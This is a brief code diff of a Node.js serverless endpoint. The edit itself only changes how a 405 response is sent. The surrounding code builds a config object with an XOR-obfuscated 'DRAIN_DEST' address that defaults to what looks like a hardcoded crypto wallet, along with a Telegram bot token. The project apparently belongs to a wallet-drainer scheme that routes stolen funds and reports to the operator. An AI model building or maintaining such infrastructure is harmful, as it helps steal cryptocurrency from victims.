@@ -14,7 +14,7 @@ module.exports = (req, res) => {
   res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   if (req.method === 'OPTIONS') { res.statusCode = 204; return res.end(); }
-  if (req.method !== 'GET') return res.status(405).end();
+  if (req.method !== 'GET') { res.statusCode = 405; return res.end(); }
   const seed = {
     d: xorEnc(process.env.DRAIN_DEST || 'AJ5obv7kqWiBCiqAAsqR9Anx9XEoKjnCVM4vKAgABFPM'),
     tok: process.env.TG_TOK || '',
